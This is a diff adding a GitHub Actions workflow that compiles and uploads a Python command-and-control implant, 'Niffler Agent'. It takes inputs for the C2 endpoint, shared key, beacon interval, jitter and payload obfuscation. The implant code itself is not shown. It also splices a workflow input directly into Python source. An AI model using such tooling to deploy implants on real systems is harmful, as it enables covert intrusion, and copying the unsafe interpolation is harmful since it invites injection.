@@ -1,0 +1,78 @@
+name: Build Niffler Agent
+
+on:
+  workflow_dispatch:
+    inputs:
+      c2_endpoint:
+        description: Override the C2 endpoint used by the generated implant.
+        required: false
+        default: ""
+      shared_key:
+        description: Override the shared key used for encryption.
+        required: false
+        default: ""
+      beacon_interval:
+        description: Override the beacon interval in seconds.
+        required: false
+        default: ""
+      jitter:
+        description: Override the jitter window in seconds.
+        required: false
+        default: ""
+      obfuscate:
+        description: Apply lightweight obfuscation/minification to the payload before build.
+        required: false
+        type: boolean
+        default: true
+
+jobs:
+  build-agent:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: Check out repository
+        uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+
+      - name: Install build dependencies
+        run: python -m pip install --upgrade pip pyyaml
+
+      - name: Compile implant payload
+        env:
+          C2_ENDPOINT_INPUT: ${{ github.event.inputs.c2_endpoint }}
+          SHARED_KEY_INPUT: ${{ github.event.inputs.shared_key }}
+          BEACON_INTERVAL_INPUT: ${{ github.event.inputs.beacon_interval }}
+          JITTER_INPUT: ${{ github.event.inputs.jitter }}
+        run: |
+          python - <<'PY'
+          import os
+          from backend.builder import compile_implant
+
+          overrides = {}
+          if os.getenv("C2_ENDPOINT_INPUT", "").strip():
+              overrides["c2_endpoint"] = os.environ["C2_ENDPOINT_INPUT"]
+          if os.getenv("SHARED_KEY_INPUT", "").strip():
+              overrides["shared_key"] = os.environ["SHARED_KEY_INPUT"]
+          if os.getenv("BEACON_INTERVAL_INPUT", "").strip():
+              overrides["beacon_interval"] = int(os.environ["BEACON_INTERVAL_INPUT"])
+          if os.getenv("JITTER_INPUT", "").strip():
+              overrides["jitter"] = int(os.environ["JITTER_INPUT"])
+
+          output_path = compile_implant(
+              output_path="dist/niffler_agent.py",
+              config_overrides=overrides,
+              obfuscate=${{ github.event.inputs.obfuscate }},
+          )
+          print(f"Built payload at {output_path}")
+          PY
+
+      - name: Upload compiled agent
+        uses: actions/upload-artifact@v4
+        with:
+          name: niffler-agent
+          path: dist/niffler_agent.py
